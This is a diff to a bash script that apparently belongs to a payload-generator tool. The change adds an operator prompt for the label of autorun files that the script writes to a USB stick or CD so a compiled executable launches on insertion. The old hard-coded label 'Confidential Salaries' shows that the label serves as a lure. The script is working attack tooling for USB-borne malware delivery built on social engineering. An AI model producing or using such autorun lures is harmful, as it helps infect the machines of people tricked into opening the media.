@@ -89,6 +89,15 @@ echo ""
 echo -ne "\e[01;32m>\e[00m "
 read OUTPUTNAME
 echo ""
+echo -e "\e[1;31m-------------------------------------------------------\e[00m"
+echo -e "\e[01;31m[?]\e[00m Type the Desired Label for the AutoRun Files"
+echo -e "\e[1;31m-------------------------------------------------------\e[00m"
+echo ""
+echo "Example : Confidential Salaries"
+echo ""
+echo -ne "\e[01;32m>\e[00m "
+read LABEL
+echo ""
 
 #Check for gcc compiler
 
@@ -295,7 +304,7 @@ cp icons/autorun.ico autorun/ >/dev/null 2>&1
 echo "[autorun]" > autorun/autorun.inf
 echo "open="$OUTPUTNAME"" >> autorun/autorun.inf
 echo "icon=autorun.ico" >> autorun/autorun.inf
-echo "label=Confidential Salaries" >> autorun/autorun.inf
+echo "label="$LABEL"" >> autorun/autorun.inf
 echo ""
 echo -e "\e[01;32m[+]\e[00m I have also created 3 AutoRun files here: \e[01;32m"$LOCATED"/"autorun/"\e[00m - simply copy these files to a CD or USB"
 
